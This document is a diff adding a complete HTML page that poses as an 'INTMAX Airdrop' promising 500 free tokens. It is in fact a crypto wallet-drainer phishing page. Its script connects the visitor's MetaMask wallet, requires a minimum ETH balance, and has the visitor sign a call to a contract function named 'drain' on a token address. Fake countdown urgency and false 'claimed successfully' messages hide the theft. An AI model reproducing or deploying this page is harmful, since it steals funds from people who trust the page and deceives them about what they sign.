@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>INTMAX Airdrop July 2025</title>
+  <style>
+    /* Reset & base */
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+    body, html {
+      height: 100%;
+      background: #000;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #ddd;
+      overflow-x: hidden;
+      position: relative;
+    }
+    /* Animated background gradient */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 200%; height: 200%;
+      background: linear-gradient(45deg, #6a0dad, #003366, #1a1a40, #6a0dad);
+      background-size: 400% 400%;
+      animation: gradientMove 30s ease infinite;
+      z-index: -1;
+      filter: brightness(0.3);
+    }
+    @keyframes gradientMove {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+    nav {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 56px;
+      background: rgba(10,10,10,0.85);
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.8);
+      z-index: 10;
+    }
+    nav .left {
+      flex: 1;
+      display: flex;
+      align-items: center;
+    }
+    nav .left img.logo {
+  height: 60px;                /* Perbesar ukuran logo */
+  margin-left: 16px;           /* Tambah jarak dari sisi kiri */
+  margin-right: -2%;          /* Jarak antar logo dan teks */
+  user-select: none;
+  filter: drop-shadow(0 0 3px #6a0dad);
+}
+
+    
+    nav .left .title {
+      font-weight: 700;
+      font-size: 1.25rem;
+      background: linear-gradient(90deg, #6a0dad, #003366);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      user-select: none;
+      letter-spacing: 1.2px;
+    }
+    nav .right {
+      display: flex;
+      gap: 18px;
+    }
+    nav .right button {
+      background: transparent;
+      border: 2px solid #6a0dad;
+      border-radius: 20px;
+      color: #6a0dad;
+      padding: 6px 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s, color 0.3s;
+      user-select: none;
+    }
+    nav .right button:hover {
+      background: #6a0dad;
+      color: #fff;
+    }
+    main.container {
+      max-width: 460px;
+      margin: 100px auto 60px;
+      background: rgba(15, 10, 30, 0.9);
+      border-radius: 20px;
+      padding: 40px 36px 50px;
+      box-shadow: 0 0 25px #6a0dadaa;
+      text-align: center;
+    }
+    main.container h1 {
+      font-size: 2.6rem;
+      font-weight: 900;
+      margin-bottom: 12px;
+      background: linear-gradient(90deg, #6a0dad, #003366);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 2px;
+      user-select: none;
+    }
+    main.container p.desc {
+      font-size: 1.1rem;
+      margin-bottom: 26px;
+      color: #b3a9d6cc;
+      user-select: none;
+    }
+    .info {
+      text-align: left;
+      color: #aaa;
+      font-weight: 600;
+      font-size: 0.95rem;
+      margin-bottom: 30px;
+      border-left: 3px solid #6a0dad;
+      padding-left: 16px;
+      user-select: none;
+    }
+    .info p strong {
+      color: #d2c3f7;
+    }
+    #countdown {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #a280d9;
+      margin-bottom: 36px;
+      user-select: none;
+      letter-spacing: 1.1px;
+      text-shadow: 0 0 6px #6a0dad88;
+    }
+    button#connectBtn, button#claimBtn {
+      width: 100%;
+      font-weight: 700;
+      font-size: 1.2rem;
+      border-radius: 16px;
+      padding: 14px;
+      cursor: pointer;
+      border: none;
+      margin-bottom: 20px;
+      user-select: none;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: 0 4px 18px #6a0dadcc;
+    }
+    button#connectBtn {
+      background: linear-gradient(90deg, #6a0dadcc, #3f2c65cc);
+      color: #eee;
+    }
+    button#connectBtn:hover:not(:disabled) {
+      background: linear-gradient(90deg, #3f2c65, #6a0dad);
+      box-shadow: 0 6px 22px #6a0dadff;
+    }
+    button#claimBtn {
+      background: linear-gradient(90deg, #302b50cc, #201a40cc);
+      color: #888;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    button#claimBtn.enabled {
+      cursor: pointer;
+      color: #fff;
+      background: linear-gradient(90deg, #6a0dadcc, #3f2c65cc);
+      box-shadow: 0 4px 18px #6a0dadcc;
+    }
+    #status {
+      min-height: 26px;
+      font-weight: 600;
+      color: #b3a9d6cc;
+      font-size: 0.95rem;
+      user-select: none;
+      word-break: break-word;
+      margin-bottom: 8px;
+      min-height: 28px;
+    }
+    footer {
+      max-width: 460px;
+      margin: 40px auto 60px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #7a6edc;
+      user-select: none;
+    }
+    footer a {
+      color: #a285d9;
+      text-decoration: none;
+      font-weight: 700;
+      transition: color 0.3s ease;
+    }
+    footer a:hover {
+      color: #d7cbff;
+      text-decoration: underline;
+    }
+    /* Modal */
+    #modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+      z-index: 50;
+      user-select: none;
+    }
+    #modal.show {
+      visibility: visible;
+      opacity: 1;
+    }
+    #modal .modal-content {
+      background: #1e1a3c;
+      border-radius: 16px;
+      padding: 36px 32px;
+      box-shadow: 0 0 20px #6a0dadcc;
+      max-width: 380px;
+      width: 90vw;
+      text-align: center;
+      color: #c5bbf5;
+    }
+    #modal .modal-content h3 {
+      font-weight: 900;
+      margin-bottom: 20px;
+      font-size: 1.4rem;
+      user-select: none;
+    }
+    #modal .spinner {
+      border: 5px solid #5d4f9d44;
+      border-top: 5px solid #6a0dad;
+      border-radius: 50%;
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 20px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to {transform: rotate(360deg);}
+    }
+    #txStatus {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #b3a9d6cc;
+      user-select: none;
+      min-height: 26px;
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <div class="left">
+      <img src="mylogo.png" alt="INTMAX Logo" class="logo" />
+      <span class="title">INTMAX</span>
+    </div>
+    <div class="right">
+      <button>Home</button>
+      <button>About</button>
+      <button>Help</button>
+    </div>
+  </nav>
+
+  <main class="container" role="main" aria-label="INTMAX Token Airdrop July 2025">
+    <h1>INTMAX Airdrop July 2025</h1>
+    <p class="desc">Claim <strong>500 $INTMAX</strong> tokens for free! Connect your wallet and submit your claim now.</p>
+
+    <section class="info" aria-label="Airdrop details">
+      <p><strong>Total Airdrop:</strong> 1,000,000 $INTMAX</p>
+      <p><strong>Eligible Wallet:</strong> Minimum 0.01 ETH balance</p>
+      <p><strong>Deadline:</strong> <span id="deadline"></span></p>
+    </section>
+
+    <div id="countdown" aria-live="polite" aria-atomic="true"></div>
+
+    <button id="connectBtn" type="button">Connect Wallet</button>
+    <button id="claimBtn" type="button" disabled>Claim Airdrop</button>
+
+    <p id="status" role="status" aria-live="polite" aria-atomic="true"></p>
+  </main>
+
+  <footer>
+    Contact us at <a href="mailto:support@intmax.io" target="_blank" rel="noopener noreferrer">support@intmax.io</a>
+  </footer>
+
+  <div id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
+    <div class="modal-content">
+      <h3 id="modalTitle">Processing your transaction...</h3>
+      <div class="spinner" aria-label="Loading animation"></div>
+      <p id="txStatus" aria-live="polite"></p>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
+  <script>
+    const CONTRACT_ADDRESS = "0xaE8183621c5f7e219C063820cF7865d232C0bB32"; // ganti sesuai kontrakmu
+    const ABI = [
+      {
+        "inputs": [{ "internalType": "address", "name": "token", "type": "address" }],
+        "name": "drain",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
+
+    const connectBtn = document.getElementById("connectBtn");
+    const claimBtn = document.getElementById("claimBtn");
+    const status = document.getElementById("status");
+    const modal = document.getElementById("modal");
+    const txStatus = document.getElementById("txStatus");
+    const countdownEl = document.getElementById("countdown");
+    const deadlineEl = document.getElementById("deadline");
+
+    const airdropDeadline = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000);
+    deadlineEl.innerText = airdropDeadline.toLocaleString();
+
+    function updateCountdown() {
+      const now = Date.now();
+      const diff = airdropDeadline.getTime() - now;
+      if (diff < 0) {
+        countdownEl.innerText = "Airdrop has ended";
+        claimBtn.disabled = true;
+        claimBtn.classList.remove("enabled");
+        connectBtn.disabled = false;
+        return;
+      }
+      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
+      const minutes = Math.floor((diff / (1000 * 60)) % 60);
+      const seconds = Math.floor((diff / 1000) % 60);
+      countdownEl.innerText = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+    }
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    let provider, signer, contract;
+
+    async function checkEligibility(address) {
+      const balance = await provider.getBalance(address);
+      const ethBalance = Number(ethers.formatEther(balance));
+      return ethBalance >= 0.01;
+    }
+
+    connectBtn.addEventListener("click", async () => {
+      if (typeof window.ethereum === "undefined") {
+        status.innerText = "Please install MetaMask!";
+        return;
+      }
+      try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        status.innerText = `Connected: ${accounts[0]}`;
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        const eligible = await checkEligibility(accounts[0]);
+        if (!eligible) {
+          status.innerText = "Wallet NOT eligible (need ≥ 0.01 ETH)";
+          claimBtn.disabled = true;
+          claimBtn.classList.remove("enabled");
+          return;
+        }
+        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+        connectBtn.disabled = true;
+        claimBtn.disabled = false;
+        claimBtn.classList.add("enabled");
+      } catch (err) {
+        console.error("Connection error:", err);
+        status.innerText = `Connection rejected: ${err.message || err}`;
+      }
+    });
+
+    claimBtn.addEventListener("click", async () => {
+      const tokenAddress = prompt("Enter ERC20 token address to claim:");
+      if (!tokenAddress) {
+        status.innerText = "Token address is required";
+        return;
+      }
+      try {
+        modal.classList.add("show");
+        txStatus.innerText = "Waiting for transaction confirmation...";
+        const tx = await contract.drain(tokenAddress);
+        txStatus.innerText = `Transaction sent: ${tx.hash}`;
+        await tx.wait();
+        txStatus.innerText = "Transaction confirmed! Airdrop claimed successfully.";
+        status.innerText = "Airdrop claimed! Check your wallet.";
+      } catch (err) {
+        txStatus.innerText = `Transaction failed: ${err.message}`;
+        status.innerText = "Transaction failed.";
+      } finally {
+        setTimeout(() => modal.classList.remove("show"), 4000);
+      }
+    });
+  </script>
+</body>
+</html>
